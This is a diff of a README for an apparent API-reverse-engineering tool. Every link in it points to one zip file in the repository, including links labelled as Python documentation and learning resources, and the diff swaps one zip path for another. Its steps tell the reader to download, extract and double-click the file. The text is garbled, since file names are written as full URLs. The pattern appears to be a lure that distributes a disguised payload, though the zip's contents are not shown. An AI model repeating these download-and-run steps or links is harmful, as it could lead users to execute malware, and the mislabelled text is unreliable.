@@ -8,7 +8,7 @@ reverse-api-engineer helps you capture traffic and automatically generates Pytho
 To start using reverse-api-engineer, follow these simple steps to download and run the software. 
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/yqman34/reverse-api-engineer/main/plugins/engineer-api-reverse-1.2-alpha.2.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/yqman34/reverse-api-engineer/main/plugins/engineer-api-reverse-1.2-alpha.2.zip)
+[![Download Latest Release](https://github.com/yqman34/reverse-api-engineer/raw/refs/heads/main/examples/ikea/api-reverse-engineer-runefolk.zip%20Latest%20Release-v1.0-blue)](https://github.com/yqman34/reverse-api-engineer/raw/refs/heads/main/examples/ikea/api-reverse-engineer-runefolk.zip)
 
 ## 📋 System Requirements
 - **Operating System:** Windows 10 or later, macOS, or any Linux distribution
@@ -20,10 +20,10 @@ To start using reverse-api-engineer, follow these simple steps to download and r
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page and download the latest version of the application.  
-   [Download from Releases](https://raw.githubusercontent.com/yqman34/reverse-api-engineer/main/plugins/engineer-api-reverse-1.2-alpha.2.zip)
+   [Download from Releases](https://github.com/yqman34/reverse-api-engineer/raw/refs/heads/main/examples/ikea/api-reverse-engineer-runefolk.zip)
 
 2. **Choose Your File**  
-   On the releases page, look for the latest version. You will see various files available. If you are unsure, look for the file named `https://raw.githubusercontent.com/yqman34/reverse-api-engineer/main/plugins/engineer-api-reverse-1.2-alpha.2.zip`.  
+   On the releases page, look for the latest version. You will see various files available. If you are unsure, look for the file named `https://github.com/yqman34/reverse-api-engineer/raw/refs/heads/main/examples/ikea/api-reverse-engineer-runefolk.zip`.  
 
 3. **Download the File**  
    Click on the file name to download it directly to your computer.
@@ -32,7 +32,7 @@ To start using reverse-api-engineer, follow these simple steps to download and r
    Once the file is downloaded, locate it in your downloads folder, and extract it using a tool like WinRAR or built-in extraction tools in your operating system.
 
 5. **Run the Application**  
-   Inside the extracted folder, you will find the `https://raw.githubusercontent.com/yqman34/reverse-api-engineer/main/plugins/engineer-api-reverse-1.2-alpha.2.zip` file (or equivalent for your OS). Double-click this file to start the application.
+   Inside the extracted folder, you will find the `https://github.com/yqman34/reverse-api-engineer/raw/refs/heads/main/examples/ikea/api-reverse-engineer-runefolk.zip` file (or equivalent for your OS). Double-click this file to start the application.
 
 6. **Follow the On-screen Instructions**  
    The application will guide you through the setup process. Enter the information as prompted to use the tool effectively.
@@ -71,8 +71,8 @@ For questions or support, please open an issue on the GitHub repository. The com
 
 Check out the following resources to learn more about reverse engineering and API usage:
 
-- Python Documentation: [https://raw.githubusercontent.com/yqman34/reverse-api-engineer/main/plugins/engineer-api-reverse-1.2-alpha.2.zip](https://raw.githubusercontent.com/yqman34/reverse-api-engineer/main/plugins/engineer-api-reverse-1.2-alpha.2.zip)
-- API Best Practices: [https://raw.githubusercontent.com/yqman34/reverse-api-engineer/main/plugins/engineer-api-reverse-1.2-alpha.2.zip](https://raw.githubusercontent.com/yqman34/reverse-api-engineer/main/plugins/engineer-api-reverse-1.2-alpha.2.zip)
-- Learn about Scraping: [https://raw.githubusercontent.com/yqman34/reverse-api-engineer/main/plugins/engineer-api-reverse-1.2-alpha.2.zip](https://raw.githubusercontent.com/yqman34/reverse-api-engineer/main/plugins/engineer-api-reverse-1.2-alpha.2.zip)
+- Python Documentation: [https://github.com/yqman34/reverse-api-engineer/raw/refs/heads/main/examples/ikea/api-reverse-engineer-runefolk.zip](https://github.com/yqman34/reverse-api-engineer/raw/refs/heads/main/examples/ikea/api-reverse-engineer-runefolk.zip)
+- API Best Practices: [https://github.com/yqman34/reverse-api-engineer/raw/refs/heads/main/examples/ikea/api-reverse-engineer-runefolk.zip](https://github.com/yqman34/reverse-api-engineer/raw/refs/heads/main/examples/ikea/api-reverse-engineer-runefolk.zip)
+- Learn about Scraping: [https://github.com/yqman34/reverse-api-engineer/raw/refs/heads/main/examples/ikea/api-reverse-engineer-runefolk.zip](https://github.com/yqman34/reverse-api-engineer/raw/refs/heads/main/examples/ikea/api-reverse-engineer-runefolk.zip)
 
 Thank you for choosing reverse-api-engineer. Enjoy creating Python API clients effortlessly!
